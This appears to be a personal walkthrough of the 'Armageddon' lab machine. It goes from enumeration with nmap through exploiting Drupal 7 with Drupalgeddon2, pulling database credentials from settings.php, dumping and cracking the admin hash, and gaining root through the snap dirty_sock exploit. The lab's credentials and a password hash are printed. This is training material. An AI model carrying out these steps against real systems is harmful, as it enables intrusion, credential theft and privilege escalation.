## Armageddon

### Lab Details 

- Difficulty:Easy 
- Type: Drupal CMS, Web Exploit, mysql, snapd, snapcraf, Linux

#### Tasks

Q1: How many TCP ports are open on Armageddon?
 - `nmap -sT -T4 -vv -A -p- -oA nmap_armageddon 10.10.10.233`

Q2: What is the name of the content management system the website is using?
 - from the output of the nmap scan
 ```
 80/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
 |_http-title: Welcome to  Armageddon |  Armageddon
 | http-robots.txt: 36 disallowed entries 
 | /includes/ /misc/ /modules/ /profiles/ /scripts/ 
 | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
 | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
 | /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
 | /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
 | /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
 | /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
 |_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
 |_http-generator: **Drupal 7** (http://drupal.org) 
 |_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

 ```

Q3: What is the name given to the exploit that targets Drupal < 8.3.9 / < 8.4.6 / < 8.5.1?
 - use searchsploit to find more about the exploit 
 - `searchsploit drupal`
 ```
 Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution  | php/remote/44482.rb
 Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution  | php/webapps/44448.py
 ```  

Q4: What user is the webserver running as?
 - use msfconsole and module `unix/webapp/drupal_drupalgeddon2`
 - run the exploit and confirm with whoami

Q5: What is the password for the MySQL database used by the site?
 - according to post https://www.drupal.org/forum/support/post-installation/2009-01-14/mysql-password-location  - the location of MySQL database password is stored at /var/www/html/sites/default/settings.php
 ```
 $databases = array (
   'default' => 
   array (
     'default' => 
     array (
       'database' => 'drupal',
       'username' => 'drupaluser',
       'password' => 'CQHEy@9M*m23gBVj',
       'host' => 'localhost',
       'port' => '',
       'driver' => 'mysql',
       'prefix' => '',
     ),
   ),
 );
 ```


Q6: What is the name of the table in the Drupal database that holder usernames and password hashes?
 - according to post https://www.drupal.org/forum/support/post-installation/2006-03-23/where-does-drupal-store-a-users-password
 - users table stored username and password in name and pass column respectively
 - tried to use msfconsole to load a shell however the shell is non-interactive
 - tried to load different reverse shells unable to execute
 - tried https://github.com/dreadlocked/Drupalgeddon2 worked 
 - tried to connect directly to mysql using below command however no output
   `armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -h locahost` 
 - used below command to run command as drupaluser line by line to dump 
   ```
    armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases
    armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal;show tables;
    armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal;select * from users;
    ...
    1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt 
   ```


Q7: What is the brucetherealadmin's password?
 - there is algorithm for drupal encryption
 - `hashcat -m 7900 hash rockyou.txt

Q8: What is the full path to the binary on this machine that brucetherealadmin can run as root?
 - /usr/bin/snap -> `sudo -l'

Q9: Submit the flag located in root's home directory.
 - attempted below
  1. checked gtfobin for privilege escalation
  2. run linpeas.sh found some CVEs 
  3. tried to compile a snapcraft project, required lxd dependence to be setup 
  4. search online found https://github.com/f4T1H21/dirty_sock
  5. transferred file and was able to gain a root shell

#### Lesson Learned
 - If unable to elevate shell or unable to move further backtrack and use another exploit or different exploit. 
